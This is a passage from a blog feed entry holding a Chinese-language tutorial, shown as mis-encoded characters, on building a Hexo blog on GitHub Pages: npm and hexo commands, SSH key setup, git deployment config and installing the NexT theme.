src="https://img-blog.csdnimg.cn/20210112171614641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>ä½¿ç”¨npmå‘½ä»¤å®‰è£…hexoï¼Œè¾“å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>è€å¿ƒç­‰å¾…å®‰è£…å®Œæˆï¼Œå®‰è£…å®Œæˆä¹‹åï¼Œå…ˆåˆå§‹åŒ–æˆ‘ä»¬çš„åšå®¢ï¼Œè¾“å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init bolg</span><br></pre></td></tr></table></figure><p>tipsï¼šè¿™äº›å‘½ä»¤å¿…é¡»åœ¨æˆ‘ä»¬åˆ›å»ºçš„æ–‡ä»¶å¤¹ä¸­ä½¿ç”¨ã€‚</p><p>æ­¤æ—¶æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹æˆ‘ä»¬ç½‘ç«™çš„é›å½¢ï¼ŒæŒ‰é¡ºåºè¾“å…¥ä»¥ä¸‹ä¸‰æ¡å‘½ä»¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> hello Hexo<span class="comment">//æ–°å»ºä¸€ç¯‡åä¸ºâ€œhello Hexoâ€çš„åšå®¢</span></span><br><span class="line">hexo g<span class="comment">//ç”Ÿæˆé™æ€æ–‡ä»¶</span></span><br><span class="line">hexo s<span class="comment">//æœ¬åœ°éƒ¨ç½²é¢„è§ˆ</span></span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œæˆ‘ä»¬çš„ç½‘ç«™å·²ç»åˆæ­¥æˆå‹äº†ï¼Œå¯ä»¥è¾“å…¥localhost:4000è¿›è¡Œè®¿é—®ã€‚</p><h3 id="Hexoçš„å¸¸ç”¨å‘½ä»¤"><a href="#Hexoçš„å¸¸ç”¨å‘½ä»¤" class="headerlink" title="Hexoçš„å¸¸ç”¨å‘½ä»¤"></a>Hexoçš„å¸¸ç”¨å‘½ä»¤</h3><h4 id="åˆå§‹åŒ–å‘½ä»¤"><a href="#åˆå§‹åŒ–å‘½ä»¤" class="headerlink" title="åˆå§‹åŒ–å‘½ä»¤"></a>åˆå§‹åŒ–å‘½ä»¤</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g<span class="comment">//å®‰è£…hexo</span></span><br><span class="line">npm update hexo -g<span class="comment">//æ›´æ–°hexo</span></span><br><span class="line">hexo init<span class="comment">//åˆå§‹åŒ–åšå®¢</span></span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤ç®€å†™"><a href="#å‘½ä»¤ç®€å†™" class="headerlink" title="å‘½ä»¤ç®€å†™"></a>å‘½ä»¤ç®€å†™</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;åšå®¢åç§°&quot;</span> = hexo <span class="keyword">new</span> <span class="string">&quot;åšå®¢åç§°&quot;</span><span class="comment">//æ–°å»ºä¸€ç¯‡åšå®¢</span></span><br><span class="line">hexo g = hexo generate<span class="comment">//ç”Ÿæˆ</span></span><br><span class="line">hexo s = hexo server<span class="comment">//å¯åŠ¨æœåŠ¡å™¨</span></span><br><span class="line">hexo d = hexo deploy<span class="comment">//éƒ¨ç½²</span></span><br></pre></td></tr></table></figure><h4 id="å…¶ä»–å‘½ä»¤"><a href="#å…¶ä»–å‘½ä»¤" class="headerlink" title="å…¶ä»–å‘½ä»¤"></a>å…¶ä»–å‘½ä»¤</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo server<span class="comment">//hexoä¼šç›‘è§†æ–‡ä»¶å˜åŠ¨å¹¶è‡ªåŠ¨æ›´æ–°ï¼Œæ— é¡»é‡å¯æœåŠ¡å™¨</span></span><br><span class="line">hexo server -s<span class="comment">//é™æ€æ¨¡å¼</span></span><br><span class="line">hexo server -p <span class="number">5000</span><span class="comment">//æ›´æ”¹ç«¯å£</span></span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span><span class="comment">//è‡ªå®šä¹‰ IPåœ°å€</span></span><br><span class="line">hexo clean<span class="comment">//æ¸…é™¤ç¼“å­˜ï¼Œè‹¥æ˜¯ç½‘é¡µæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥å¿½ç•¥è¿™æ¡å‘½ä»¤</span></span><br></pre></td></tr></table></figure><h1 id="githubä»“åº“çš„åˆ›å»º"><a href="#githubä»“åº“çš„åˆ›å»º" class="headerlink" title="githubä»“åº“çš„åˆ›å»º"></a>githubä»“åº“çš„åˆ›å»º</h1><p>å¥½äº†ï¼Œåˆ°è¿™é‡Œç¡®ä¿ä¸Šæ–¹æ“ä½œæ— è¯¯å³å¯è¿›è¡Œgithubä»“åº“çš„åˆ›å»º(ä½†é¦–å…ˆä½ å¾—å…ˆæœ‰ä¸ªgithubè´¦å·å“¦)ã€‚<br>è¿›å…¥githubä¸»é¡µï¼Œé€‰æ‹©å·¦ä¸Šè§’çš„newï¼š<br><img src="https://img-blog.csdnimg.cn/20210112173349599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>è¿›å…¥åè¾“å…¥ä»“åº“åç§°ï¼Œå¿…é¡»è¦ä¸ownerä¸‹çš„åç§°ä¸€è‡´ï¼Œè¾“å…¥å®Œåç‚¹å‡»åˆ›å»ºå³å¯<br>æˆ‘å·²ç»åˆ›å»ºè¿‡ä»“åº“äº†ï¼Œæ‰€ä»¥ä¼šæç¤º<br><img src="https://img-blog.csdnimg.cn/20210112173512148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="githubSSHé…ç½®"><a href="#githubSSHé…ç½®" class="headerlink" title="githubSSHé…ç½®"></a>githubSSHé…ç½®</h1><p>æ­å»ºå®Œä»“åº“åå°±å¼€å§‹é…ç½®githubSSHã€‚</p><p>è¿›å…¥git bashä¸­ï¼ŒæŒ‰é¡ºåºè¾“å…¥å¦‚ä¸‹ä»£ç ï¼š</p><blockquote><p>git config â€“global user.email â€œ<a href="mailto:&#x78;&#x78;&#x78;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#109;">&#x78;&#x78;&#x78;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#109;</a>â€œ    //å¡«å†™æ³¨å†Œgithubçš„é‚®ç®±</p></blockquote><blockquote><p>git config â€“global user.name â€œxxxxâ€    //github ç”¨æˆ·å</p></blockquote><blockquote><p>ssh-keygen    //è¾“å…¥å®Œè¿™ä¸ªå°±ä¸€è‡´enterå°±è¡Œäº†</p></blockquote><p>ç„¶åè¿›å…¥ç”¨æˆ·ç›®å½•ä¸‹çš„.sshï¼Œæ‰“å¼€id_rsa.pubï¼Œå¤åˆ¶é‡Œé¢çš„å†…å®¹ã€‚</p><p>è¿›å…¥githubï¼Œæ–°å»ºä¸€ä¸ªSSHå°±å¯ä»¥äº†ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210112180408871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="sublimeçš„å®‰è£…ä½¿ç”¨"><a href="#sublimeçš„å®‰è£…ä½¿ç”¨" class="headerlink" title="sublimeçš„å®‰è£…ä½¿ç”¨"></a>sublimeçš„å®‰è£…ä½¿ç”¨</h1><p>sublimeæ˜¯ä¸€ä¸ªå¥½ç”¨çš„æ–‡æœ¬ç¼–è¾‘å™¨ã€‚</p><p>1ã€sublimeä¸‹è½½<br>å¯ä»¥å»å®˜ç½‘ä¸‹è½½ï¼š<a href="http://www.sublimetext.com/3">http://www.sublimetext.com/3</a><br>ä¹Ÿå¯ä»¥äº‘ç›˜ä¸‹è½½ï¼š<a href="https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw">https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw</a> æå–ç ï¼š42pf </p><p>2ã€é€‰æ‹©ä¸€ä¸ªé™¤Cç›˜å¤–çš„å®‰è£…ç›®å½•ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112203141300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3ã€ç„¶åç‚¹å‡»nextï¼Œå®‰è£…å®Œæˆï¼š<br><img src="https://img-blog.csdnimg.cn/20210112203231376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4ã€å°†åšå®¢ç›®å½•æ‹–å…¥sublimeï¼š<br><img src="https://img-blog.csdnimg.cn/20210112210759495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Hexoä¸githubè¿æ¥"><a href="#Hexoä¸githubè¿æ¥" class="headerlink" title="Hexoä¸githubè¿æ¥"></a>Hexoä¸githubè¿æ¥</h1><p>1ã€åœ¨sublimeä¸­æ‰“å¼€_config.ymlï¼Œå°†Deploymentæ”¹ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lucifer-rossweisse/lucifer-rossweisse.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>å…¶ä¸­â€repoâ€å†…å¡«å†™githubä»“åº“ä¸­çš„SSHé“¾æ¥<br><img src="https://img-blog.csdnimg.cn/20210112211302998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2ã€å°†â€urlâ€åæ”¹ä¸ºâ€<a href="http://githubé¡¹ç›®å&quot;/">http://githubé¡¹ç›®å&quot;</a><br><img src="https://img-blog.csdnimg.cn/20210112211442895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3ã€åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ä¸‹åˆ—ä»£ç ï¼Œå®‰è£…æ’ä»¶ï¼Œä¸Šä¼ åšå®¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git config --global user.email <span class="string">&quot;githubé‚®ç®±&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;githubç”¨æˆ·å&quot;</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>4ã€åœ¨æµè§ˆå™¨ä¸­è¾“å…¥åšå®¢ç½‘å€ï¼Œä¹Ÿæ˜¯githubä»“åº“åï¼Œå³å¯æŸ¥çœ‹(æœ‰æ—¶å€™éœ€è¦ç­‰ä¸€ä¼š)<br><img src="https://img-blog.csdnimg.cn/20210112211855757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Hexoçš„ä¸»é¢˜åˆ‡æ¢"><a href="#Hexoçš„ä¸»é¢˜åˆ‡æ¢" class="headerlink" title="Hexoçš„ä¸»é¢˜åˆ‡æ¢"></a>Hexoçš„ä¸»é¢˜åˆ‡æ¢</h1><p>å…¶å®å‰é¢å·²ç»æŠŠé‡è¦çš„éƒ¨åˆ†æ•´å®Œäº†ï¼Œæœ€åå°±æ¢ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ä¸»é¢˜å°±å¥½äº†ã€‚</p><p>ä¸»é¢˜å¯ä»¥ä»githubä¸Šæœhexo-themè¿›è¡ŒæŸ¥æ‰¾ï¼Œæ¯”è¾ƒå—æ¬¢è¿çš„æ˜¯nextå’Œyiliaè¿™ä¸¤ä¸ªä¸»é¢˜ï¼Œä»¥nextä¸ºä¸»ï¼Œä¹‹åä¸»é¢˜çš„åˆ‡æ¢éƒ½å¯ä»¥è¿™ä¹ˆæ¥ã€‚</p><p>1ã€è¿›å…¥åšå®¢æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€git bashï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œåå¯ä»¥çœ‹åˆ°åšå®¢æ–‡ä»¶å¤¹ä¸­çš„themesé‡Œå‡ºç°äº†ä¸€ä¸ªnextæ–‡ä»¶å¤¹ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬ä¸‹è½½çš„nextä¸»é¢˜ã€‚<br><img src="https://img-blog.csdnimg.cn/20210112212458400.png"><br>2ã€ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œè¿›å…¥åšå®¢æ–‡ä»¶å¤¹ä¸­çš„_config.ymlä¿®æ”¹ä¸»é¢˜<br><img src="https://img-blog.csdnimg.cn/20210112212618350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3ã€ç„¶åå…ˆåœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210112212918907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><p>4ã€æœ€åç›´æ¥ä¸Šä¼ å‘å¸ƒåšå®¢å°±å¥½äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šhexoåœ¨5.0ä¹‹åæŠŠswigç»™åˆ é™¤äº†ï¼Œéœ€è¦è‡ªå·±æ‰‹åŠ¨å®‰è£…ï¼Œä¸ç„¶å®‰è£…nextä¸»é¢˜åä¼šæ˜¾ç¤ºé”™è¯¯<br>è¾“å…¥ä¸‹é¢è¿™ä¸²ä»£ç å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure><p>ç„¶åhexo cæ¸…ç†ç¼“å­˜ï¼Œhexo g &amp; så³å¯ã€‚</p><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>å…¨éƒ¨çš„æ­å»ºæ­¥éª¤å·²ç»è®²å®Œäº†ï¼Œå†™ç¯‡åšå®¢å…¶å®åªæ˜¯ä¸ºäº†è®°å½•ä¸€ä¸‹è‡ªå·±å­¦ä¹ çš„æ­å»ºè¿‡ç¨‹ï¼Œå¦‚æœå¯¹ä½ æœ‰å¸®åŠ©çš„è¯ï¼Œå¯ä»¥åˆ†äº«ç»™ä½ çš„æœ‹å‹å“¦(ï¿£â–½ï¿£)â€</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;æ­å»ºæ­¥éª¤&quot;&gt;&lt;a href=&quot;#æ­å»ºæ­¥éª¤&quot; class=&quot;headerlink&quot; title=&quot;æ­å»ºæ­¥éª¤&quot;&gt;&lt;/a&gt;æ­å»ºæ­¥éª¤&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;ç¯å¢ƒæ­å»º&lt;ul&gt;
&lt;li&gt;å®‰è£…node.js&lt;/li&gt;
&lt;li&gt;å®‰è£…git&lt;/li&gt;
&lt;li&gt;å®‰è£…Hexo&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;githubä»“åº“çš„åˆ›å»º&lt;/li&gt;
&lt;li&gt;githubSSHçš„é…ç½®&lt;/li&gt;
&lt;li&gt;sublimeçš„å®‰è£…ä½¿ç”¨&lt;/li&gt;
&lt;li&gt;Hexoä¸githubè¿æ¥&lt;/li&gt;
&lt;li&gt;Hexoçš„ä¸»é¢˜åˆ‡æ¢</summary>
    
    
    
    <category term="hexo" scheme="https://lucifer-rossweisse.github.io/categories/hexo/"/>
    
    
    <category term="hexo" scheme="https://lucifer-rossweisse.github.io/tags/hexo/"/>
    
    <category term="next" scheme="https://lucifer-rossweisse.github.io/tags/next/"/>
    
  </entry>
  
</feed>
